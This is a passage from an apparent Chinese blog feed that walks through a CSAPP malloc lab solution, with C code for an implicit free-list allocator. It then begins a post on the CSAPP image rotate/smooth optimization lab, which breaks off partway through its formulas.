PREV_BLKP(bp)   ((char *)(bp)-GET_SIZE(((char *)(bp)-DSIZE)))</span><br></code></pre></td></tr></table></figure><p>GET 宏读取和返回指针 p 的引用，这里强制转换是非常重要的，类似地，PUT 宏将 val 存放到 p 指向的字中。GET_SIZE 宏和 GET_ALLOC 宏从 p 处的获得块的大小和分配标识位，注意到，这里的指针 p 应该指向整个块。</p><p>之后的指针 bp 指向的就是块的有效负载。HDRP 宏和 FTRP 宏分别指向这个块的头部和脚部，因为有效载荷紧挨着头部，头部大小为 4 字节，所以 <code>(char *)bp-WSIZE</code> 就是指向头部，脚部大小也是 4 字节，且 GET_SIZE 宏指的是整个块大小，因此要减去 8 个字节才是指到了脚部。而对于 NEXT_BLKP 宏和 PREV_BLKP 宏，情况更加复杂，程序需要读到上个块（下个块）的脚部（头部），才能通过加上块大小偏移量来获得下一个块的指针。</p><h3 id="创建空闲块链表">创建空闲块链表</h3><p>在调用 <code>mm_malloc</code> 和 <code>mm_free</code> 函数之前，必须要调用 <code>mm_init</code> 进行初始化。<code>mm_init</code> 函数创建了一个空的空闲块链表，然后调用 <code>extend_heap</code> 函数，做最初的堆空间扩展。</p><p>参见上图空闲链表，<code>mm_init</code> 首先创建了一个不使用的填充字，然后创建 8 个字节的序言块，它只有头部和脚部，但它永不释放，类似于实现单链表时的链表头。最后创建一个结尾块，用于标识空闲链表的结束。加上了填充块后，开头的这几个块一共占用 16 个字节，正好是空闲链表所要求的的最小字节。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">mm_init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-keyword">if</span> ((heap_listp = mem_sbrk(<span class="hljs-number">4</span> * WSIZE)) == (<span class="hljs-type">void</span> *)<span class="hljs-number">-1</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    PUT(heap_listp, <span class="hljs-number">0</span>);                            <span class="hljs-comment">/* Alignment padding */</span><br>    PUT(heap_listp + (<span class="hljs-number">1</span> * WSIZE), PACK(DSIZE, <span class="hljs-number">1</span>)); <span class="hljs-comment">/* Prologue header */</span><br>    PUT(heap_listp + (<span class="hljs-number">2</span> * WSIZE), PACK(DSIZE, <span class="hljs-number">1</span>)); <span class="hljs-comment">/* Prologue header */</span><br>    PUT(heap_listp + (<span class="hljs-number">3</span> * WSIZE), PACK(<span class="hljs-number">0</span>, <span class="hljs-number">1</span>));     <span class="hljs-comment">/* Epilogue header */</span><br>    heap_listp += (<span class="hljs-number">2</span> * WSIZE);<br>    <span class="hljs-keyword">if</span> (extend_heap(CHUNKSIZE / WSIZE) == <span class="hljs-literal">NULL</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> *<span class="hljs-title function_">extend_heap</span><span class="hljs-params">(<span class="hljs-type">size_t</span> words)</span> &#123;<br>    <span class="hljs-type">char</span> *bp;<br>    <span class="hljs-type">size_t</span> size;<br><br>    size = (words % <span class="hljs-number">2</span>) ? (words + <span class="hljs-number">1</span>) * WSIZE : words * WSIZE;<br>    <span class="hljs-keyword">if</span> ((<span class="hljs-type">long</span>)(bp = mem_sbrk(size)) == (<span class="hljs-type">void</span> *)<span class="hljs-number">-1</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br><br>    PUT(HDRP(bp), PACK(size, <span class="hljs-number">0</span>));           <span class="hljs-comment">/* header */</span><br>    PUT(FTRP(bp), PACK(size, <span class="hljs-number">0</span>));           <span class="hljs-comment">/* footer */</span><br>    PUT(HDRP(NEXT_BLKP(bp)), PACK(<span class="hljs-number">0</span>, <span class="hljs-number">1</span>));   <span class="hljs-comment">/* New epilogue header */</span><br><br>    <span class="hljs-keyword">return</span> coalesce(bp);<br>&#125;<br></code></pre></td></tr></table></figure><p>其中 <code>extend_heap()</code> 函数用于堆拓展，每次拓展的大小都应该为 8 的倍数。在拓展完成后，需要注意到，<strong>如果堆顶端是一个空闲块</strong>，那么就需要调用 <code>coalesce()</code> 函数将空闲块合并。</p><h3 id="合并块">合并块</h3><p><code>coalesce()</code> 函数是对书上所述的合并块方式的简单实现。注意到，引入序言块和结尾块的好处就是，我们可以少考虑一些复杂的边界情况，因为所有要处理的块都位于链表的“中间”。这样做可以减少编码复杂度，更不容易出错。然后，宏定义也帮助我们很多。比如获取上一个块（下一个块）的分配位和大小时，只需要使用 <code>GET_ALLOC(FTRP(PREV_BLKP(bp)))</code> 即可，代码更具可读性（虽然好像还是很麻烦）:sweat_smile: 。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> *<span class="hljs-title function_">coalesce</span><span class="hljs-params">(<span class="hljs-type">void</span> *bp)</span>&#123;<br>    <span class="hljs-type">size_t</span>  prev_alloc = GET_ALLOC(FTRP(PREV_BLKP(bp)));<br>    <span class="hljs-type">size_t</span>  next_alloc = GET_ALLOC(HDRP(NEXT_BLKP(bp)));<br>    <span class="hljs-type">size_t</span> size = GET_SIZE(HDRP(bp));<br><br>    <span class="hljs-comment">// 如果上下块都是分配的 那就算了</span><br>    <span class="hljs-keyword">if</span>(prev_alloc &amp;&amp; next_alloc)<br>        <span class="hljs-keyword">return</span> bp;<br>    <br>    <span class="hljs-comment">// 合并下块</span><br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(prev_alloc &amp;&amp; !next_alloc)&#123;<br>        size += GET_SIZE(HDRP(NEXT_BLKP(bp)));<br>            PUT(HDRP(bp), PACK(size,<span class="hljs-number">0</span>));<br>            PUT(FTRP(bp), PACK(size,<span class="hljs-number">0</span>));<br>    &#125;<br>    <span class="hljs-comment">// 合并上块</span><br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(!prev_alloc &amp;&amp; next_alloc)&#123;<br>        size += GET_SIZE(HDRP(PREV_BLKP(bp)));<br>        PUT(FTRP(bp),PACK(size,<span class="hljs-number">0</span>));<br>        PUT(HDRP(PREV_BLKP(bp)),PACK(size,<span class="hljs-number">0</span>));<br>        bp = PREV_BLKP(bp);<br>    &#125;<br>    <span class="hljs-comment">// 合并上下块</span><br>    <span class="hljs-keyword">else</span> &#123;<br>        size +=GET_SIZE(FTRP(NEXT_BLKP(bp)))+ GET_SIZE(HDRP(PREV_BLKP(bp)));<br>        PUT(FTRP(NEXT_BLKP(bp)),PACK(size,<span class="hljs-number">0</span>));<br>        PUT(HDRP(PREV_BLKP(bp)),PACK(size,<span class="hljs-number">0</span>));<br>        bp = PREV_BLKP(bp);<br>    &#125;<br>    <span class="hljs-keyword">return</span> bp;<br>&#125;<br></code></pre></td></tr></table></figure><p>除了之前提到的，在 <code>extend_heap</code> 函数中需要调用 <code>coalesce</code> 函数来合并空闲块，在 <code>mm_free</code> 中也需要调用。事实上，只要有操作可以多出一个空闲块，都需要调用 <code>coalesce</code> 函数来合并。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">mm_free</span><span class="hljs-params">(<span class="hljs-type">void</span> *bp)</span> &#123;<br>    <span class="hljs-keyword">if</span>(bp == <span class="hljs-number">0</span>)<br><span class="hljs-keyword">return</span>;<br>    <br>    <span class="hljs-type">size_t</span> size = GET_SIZE(HDRP(bp));<br>    PUT(HDRP(bp), PACK(size, <span class="hljs-number">0</span>));<br>    PUT(FTRP(bp), PACK(size, <span class="hljs-number">0</span>));<br>    coalesce(bp);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="分配块">分配块</h3><p>使用 <code>mm_malloc</code> 函数来分配块，首先必须要调整分配大小，因为用户传入的数据是有效负荷需要的大小，不包括头部和脚部，而且没有实现 8 字节对齐。因此，必须先加上 8 字节后再对齐，才能进行分配。</p><p>调整完后，需要使用 <code>find_fit</code> 函数找到适合的链表空闲块，如果找到了，就放置在空闲块中，如果没有足够大的空闲块，那就需要调用 <code>extend_heap</code> 函数从堆中取出更多的内存了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> *<span class="hljs-title function_">mm_malloc</span><span class="hljs-params">(<span class="hljs-type">size_t</span> size)</span> &#123;<br>    <span class="hljs-type">size_t</span> asize;<br>    <span class="hljs-type">size_t</span> extendsize;<br>    <span class="hljs-type">char</span> *bp;<br>    <span class="hljs-keyword">if</span> (size == <span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br><br>    <span class="hljs-keyword">if</span> (size &lt;= DSIZE) &#123;<br>        asize = <span class="hljs-number">2</span> * (DSIZE);<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        asize = (DSIZE) * ((size + (DSIZE) + (DSIZE - <span class="hljs-number">1</span>)) / (DSIZE));<br>    &#125;<br>    <span class="hljs-keyword">if</span> ((bp = find_fit(asize)) != <span class="hljs-literal">NULL</span>) &#123;<br>        place(bp, asize);<br>        <span class="hljs-keyword">return</span> bp;<br>    &#125;<br>    extendsize = MAX(asize, CHUNKSIZE);<br>    <span class="hljs-keyword">if</span> ((bp = extend_heap(extendsize / WSIZE)) == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    &#125;<br>    place(bp, asize);<br>    <span class="hljs-keyword">return</span> bp;<br>&#125;<br></code></pre></td></tr></table></figure><p>对于 <code>find_fit</code> 函数，这里实现的是 <code>first-fit</code> 函数，从链表头开始搜索，只要找到了足够大的空闲块，就返回。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> *<span class="hljs-title function_">find_fit</span><span class="hljs-params">(<span class="hljs-type">size_t</span> size)</span> &#123;<br>    <span class="hljs-type">void</span> *bp;<br>    <span class="hljs-keyword">for</span> (bp = heap_listp; GET_SIZE(HDRP(bp)) &gt; <span class="hljs-number">0</span>; bp = NEXT_BLKP(bp)) &#123;<br>        <span class="hljs-keyword">if</span> (!GET_ALLOC(HDRP(bp)) &amp;&amp; (size &lt;= GET_SIZE(HDRP(bp)))) &#123;<br>            <span class="hljs-keyword">return</span> bp;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>放置函数 <code>place</code> 实现如下，特别注意，只有剩下的空间多于 16 字节时，才能组成一个空闲块。这意味着较小的碎片已经被我抛弃了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">place</span><span class="hljs-params">(<span class="hljs-type">void</span> *bp, <span class="hljs-type">size_t</span> asize)</span> &#123;<br>    <span class="hljs-type">size_t</span> csize = GET_SIZE(HDRP(bp));<br>    <span class="hljs-keyword">if</span> ((csize - asize) &gt;= (<span class="hljs-number">2</span> * DSIZE)) &#123;<br>        PUT(HDRP(bp), PACK(asize, <span class="hljs-number">1</span>));<br>        PUT(FTRP(bp), PACK(asize, <span class="hljs-number">1</span>));<br>        bp = NEXT_BLKP(bp);<br>        PUT(HDRP(bp), PACK(csize - asize, <span class="hljs-number">0</span>));<br>        PUT(FTRP(bp), PACK(csize - asize, <span class="hljs-number">0</span>));<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        PUT(HDRP(bp), PACK(csize, <span class="hljs-number">1</span>));<br>        PUT(FTRP(bp), PACK(csize, <span class="hljs-number">1</span>));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="realloc">realloc</h3><p>最后来关注一下 <code>realloc</code> 函数。这里由于时间关系，先实现了一个初步版本。排除了一些可能的极端情况后，先调用 <code>mm_malloc</code> 函数分配一个新的块。然后，就将旧数据从旧的地址移动到新的地方，并释放旧地址空间。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> *<span class="hljs-title function_">mm_realloc</span><span class="hljs-params">(<span class="hljs-type">void</span> *ptr, <span class="hljs-type">size_t</span> size)</span> &#123;<br>    <span class="hljs-type">size_t</span> oldsize;<br>    <span class="hljs-type">void</span> *newptr;<br><br>    <span class="hljs-comment">/* If size == 0 then this is just free, and we return NULL. */</span><br>    <span class="hljs-keyword">if</span> (size == <span class="hljs-number">0</span>) &#123;<br>        mm_free(ptr);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-comment">/* If oldptr is NULL, then this is just malloc. */</span><br>    <span class="hljs-keyword">if</span> (ptr == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span> mm_malloc(size);<br>    &#125;<br>    newptr = mm_malloc(size);<br>    <span class="hljs-comment">/* If realloc() fails the original block is left untouched  */</span><br>    <span class="hljs-keyword">if</span> (!newptr) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-comment">/* Copy the old data. */</span><br>    oldsize = GET_SIZE(HDRP(ptr));<br>    <span class="hljs-keyword">if</span> (size &lt; oldsize)<br>        oldsize = size;<br>    <span class="hljs-built_in">memcpy</span>(newptr, ptr, oldsize);<br><br>    <span class="hljs-comment">/* Free the old block. */</span><br>    mm_free(ptr);<br>    <span class="hljs-keyword">return</span> newptr;<br>&#125;<br></code></pre></td></tr></table></figure><p>事实上，<code>realloc</code> 函数有很多可以优化的点。首先，如果 <code>realloc</code> 传入的 <code>size</code> 比之前还小，显然我们不需要进行拷贝，直接可以考虑对当前块进行分割。其次，如果下一块是一个空闲块的话，我们可以直接将其占用。这样的话可以很大程度上减少外部碎片，充分地利用了空闲的块。接着，如果下一个块恰好是堆顶，我们也可以考虑直接拓展堆，这样的话就可以避免再去搜索空闲链表，提高效率。</p><h2 id="实验结果">实验结果</h2><p>由于时间关系，本次实验仅仅实现了一个非常简陋的 <code>malloc</code> 版本，因此得分较低。</p><p><img src="/img/CSAPP/lab5/result1.png" alt=""></p><p><img src="/img/CSAPP/lab5/result2.png" alt=""></p>]]></content>
    
    
    <categories>
      
      <category>CSAPP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CSAPP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>深入理解计算机系统之代码优化实验</title>
    <link href="/2021/06/29/2021-6-29-CSAPPLab04/"/>
    <url>/2021/06/29/2021-6-29-CSAPPLab04/</url>
    
    <content type="html"><![CDATA[<h1>深入理解计算机系统之代码优化</h1><h2 id="实验介绍">实验介绍</h2><p>图像处理中存在很多函数，可以对这些函数进行优化。本实验主要关注两种图像处理操作</p><ul><li>旋转：对图像逆时针旋转90度</li><li>平滑：对图像进行模糊操作</li></ul><p>若图像用二维矩阵 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>M</mi></mrow><annotation encoding="application/x-tex">M</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span></span></span></span> 表示，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>M</mi><mrow><mi>i</mi><mi>j</mi></mrow></msub></mrow><annotation encoding="application/x-tex">M_{ij}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9694em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.109em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">ij</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span></span></span></span> 表示图像 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>M</mi></mrow><annotation encoding="application/x-tex">M</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span></span></span></span> 的第 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mi>i</mi><mo separator="true">,</mo><mi>j</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(i, j)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">i</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mclose">)</span></span></span></span> 像素的值，像素值用红，绿，蓝表示。我们只会考虑方形图像。令N表示图像的行（或列）数，从0到N − 1编号。给定这种表示形式，旋转操作可以非常简单地实现为以下两个矩阵运算：</p><ul><li>转置：对于每对 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mi>i</mi><mo separator="true">,</mo><mi>j</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(i, j)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">i</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mclose">)</span></span></span></span>，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>M</mi><mrow><mi>i</mi><mo separator="true">,</mo><mi>j</mi></mrow></msub></mrow><annotation encoding="application/x-tex">M_{i , j}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9694em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.109em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span></span></span></span> 和 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>M</mi><mrow><mi>j</mi><mo separator="true">,</mo><mi>i</mi></mrow></msub></mrow><annotation encoding="application/x-tex">M_{j, i}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9694em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.109em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span></span></span></span> 是互换的</li><li>交换行：第i行与第N-1 − i行交换。</li></ul><p><strong>旋转操作</strong>的具体步骤如下图所示：</p><p><img src="/img/CSAPP/lab4/rotate.png" alt=""></p><p><strong>平滑操作</strong>的目标是将每个像素值改为其周围像素值的平均值。参考以下公式：</p><p class="katex-block "><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>M</mi><mn>2</mn><mo stretchy="false">[</mo><mn>1</mn><mo stretchy="false">]</mo><mo stretchy="false">[</mo><mn>1</mn><mo stretchy="false">]</mo><mo>=</mo><mfrac><mrow><munderover><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>0</mn></mrow><mn>2</mn></munderover><munderover><mo>∑</mo><mrow><mi>j</mi><mo>=</mo><mn>0</mn></mrow><mn>2</mn></munderover><mi>M</mi><mn>1</mn><mo stretchy="false">[</mo><mi>i</mi><mo stretchy="false">]</mo><mo stretchy="false">[</mo><mi>j</mi><mo stretchy="false">]</mo></mrow><mn>9</mn></mfrac></mrow><annotation encoding="application/x-tex">M2[1][1]=\frac{\sum^2_{i=0}\sum^2_{j=0}M1[i][j]}{9}  </annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mord">2</span><span class="mopen">[</span><span class="mord">1</span><span class="mclose">]</span><span class="mopen">[</span><span class="mord">1</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:2.4658em;vertical-align:-0.686em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.7798em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">9</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.8258em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:0em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.954em;"><span style="top:-2.4003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">0</span></span></span></span><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2997em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:0em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.954em;"><span style="top:-2.4003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span><span class="mrel mtight">=</span><span class="mord mtight">0</span></span></span></span><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.4358em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mord">1</span><span class="mopen">[</span><span class="mord mathnormal">i</span><span class="mclose">]</span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mclose">]</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span></p><p class="katex-block "><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>M</mi><mn>2</mn><mo stretchy="false">[</mo><mi>N</mi><mo>−</mo><mn>1</mn><mo stretchy="false">]</mo><mo stretchy="false">[</mo><mi>N</mi><mo>−</mo><mn>1</mn><mo stretchy="false">]</mo><mo>=</mo><mfrac><mrow><munderover><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mi>N</mi><mo>−</mo><mn>2</mn></mrow><mrow><mi>N</mi><mo>−</mo><mn>1</mn></mrow></munderover><munderover><mo>∑</mo><mrow><mi>j</mi><mo>=</mo><mi>N</mi><mo>−</mo><mn>2</mn></mrow><mrow><mi>N</mi><mo>−</mo><mn>1</mn></mrow></munderover><mi>M</mi><mn>1</mn><mo stretchy="false">[</mo><mi>i</mi><mo stretchy="false">]</mo><mo stretchy="false">[</mo><mi>j</mi><mo stretchy="false">]</mo></mrow><mn>4</mn></mfrac></mrow><annotation encoding="application/x-tex">M2[N−1][N−1]=\frac{\sum^{N−1}_{i=N−2}\sum^{N−1}_{j=N−2}M1[i][j]}{4} </annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mord">2</span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">]</span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2778em;"></span><span 